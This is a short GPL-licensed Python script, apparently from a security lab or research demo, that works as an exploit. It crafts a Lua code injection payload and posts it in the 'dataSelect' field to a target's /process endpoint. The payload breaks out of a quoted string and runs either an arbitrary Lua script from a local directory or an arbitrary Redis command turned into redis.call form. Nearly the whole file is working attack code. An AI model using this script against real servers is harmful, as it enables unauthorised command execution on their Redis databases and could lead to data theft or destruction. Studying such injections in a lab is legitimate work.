# Copyright (C) 2025 CEA - All Rights Reserved
# 
# This program is free software: you can redistribute it and/or modify it under
# the terms of the GNU General Public License as published by the Free Software
# Foundation, either version 3 of the License, or (at your option) any later
# version.
# 
# This program is distributed in the hope that it will be useful, but WITHOUT ANY
# WARRANTY; without even the implied warranty of  MERCHANTABILITY or FITNESS FOR
# A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License along with
# this program.  If not, see <http://www.gnu.org/licenses/>.

import requests
import sys

def transform_redis_command(redis_command):

	splitCommand = redis_command.split()
	lua_command = "redis.call('"+splitCommand[0]+"'"
	splitCommand.pop(0)

	for arg in splitCommand :
		lua_command += ", '" + arg + "'"
	
	lua_command += ')'
	return lua_command

 
url = f'http://{sys.argv[2]}:{sys.argv[3]}/process'
injection = ""


if sys.argv[1] == "-s":
	try:
		with open("../lua_scripts/" + sys.argv[4]) as f:
			injection = f"')\r\n{f.read()}\r\n--"
	except FileNotFoundError:
		print(f"[!] Error: The file '{sys.argv[4]}' could not be found.")
		print(f"[!] Please ensure that the specified file is located in the 'lua_scripts/' directory. \n")
		sys.exit(1)  
elif sys.argv[1] == "-c":
	injection = f"')\r\nif(1 == 1) then\r\nreturn {transform_redis_command(sys.argv[4])}\r\nend --"

sendData = {'dataSelect': injection}

x = requests.post(url, data = sendData)

print("[+] Server response : " + x.text + "\n")